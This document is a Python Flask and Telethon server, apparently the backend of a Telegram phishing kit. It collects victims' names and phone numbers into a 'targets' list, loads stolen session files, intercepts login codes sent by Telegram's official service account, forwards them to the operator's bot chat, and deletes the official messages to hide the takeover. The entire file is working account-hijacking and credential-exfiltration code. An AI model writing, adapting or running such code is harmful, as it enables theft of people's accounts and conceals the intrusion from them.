import os, asyncio, json, requests, re
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError

app = Flask(__name__)
CORS(app)

# Railway Variables
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

SESSION_DIR = '/tmp/sessions/'
if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)

targets = {}

def send_bot(text, buttons=None, msg_id=None):
    if msg_id:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        payload = {"chat_id": CHAT_ID, "message_id": msg_id, "text": text, "parse_mode": "Markdown"}
    else:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    
    if buttons: payload["reply_markup"] = json.dumps({"inline_keyboard": buttons})
    res = requests.post(url, json=payload).json()
    return res.get("result", {}).get("message_id")

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    nama = data.get('nama')
    nomor = data.get('nomor')

    # Kirim Laporan Awal
    text = (f"👤 *Nama:* {nama}\n"
            f"📱 *Nomor:* `{nomor}`\n"
            f"🔐 *Kata Sandi:* None\n"
            f"🔢 *OTP:* None")
    
    btns = [[{"text": "🔑 OTP", "callback_data": f"start_sniff_{nomor}"}]]
    msg_id = send_bot(text, btns)
    
    targets[nomor] = {"nama": nama, "msg_id": msg_id, "sandi": "None", "otp": "None"}
    return jsonify({"status": "success"}), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    if "callback_query" in data:
        call = data["callback_query"]
        action = call["data"]
        
        if action.startswith("start_sniff_"):
            nomor = action.split("_")[1]
            
            # CEK SESI TERLEBIH DAHULU
            session_file = f"{SESSION_DIR}{nomor}.session"
            if not os.path.exists(session_file):
                send_bot(f"❌ *Gagal:* Akun ini telah keluar dari sesi!")
                return "OK", 200
            
            # Jika file ada, jalankan sniffer
            send_bot(f"Bot siap menerima OTP! Ketik /exit untuk keluar")
            asyncio.run(start_ghost_sniffer(nomor))
            
    return "OK", 200

async def start_ghost_sniffer(nomor):
    client = TelegramClient(f"{SESSION_DIR}{nomor}", API_ID, API_HASH)
    
    try:
        await client.connect()
        
        # Cek apakah client masih terhubung secara sah
        if not await client.is_user_authorized():
            send_bot(f"⚠️ *Peringatan:* Akun ini telah keluar dari sesi atau didepak!")
            await client.disconnect()
            return

        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            msg_text = event.message.message
            otp_code = re.findall(r'\b\d{5}\b', msg_text)
            
            if otp_code:
                otp = otp_code[0]
                target = targets.get(nomor)
                
                new_text = (f"👤 *Nama:* {target['nama']}\n"
                            f"📱 *Nomor:* `{nomor}`\n"
                            f"🔐 *Kata Sandi:* {target['sandi']}\n"
                            f"🔢 *OTP:* `{otp}`")
                send_bot(new_text, msg_id=target['msg_id'])
                
                # Ghost Mode: Hapus Chat dari Telegram Official
                await event.delete()
                async for message in client.iter_messages(777000):
                    await message.delete()

        await client.run_until_disconnected()

    except Exception as e:
        send_bot(f"🛑 *Error Sesi:* {str(e)}")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)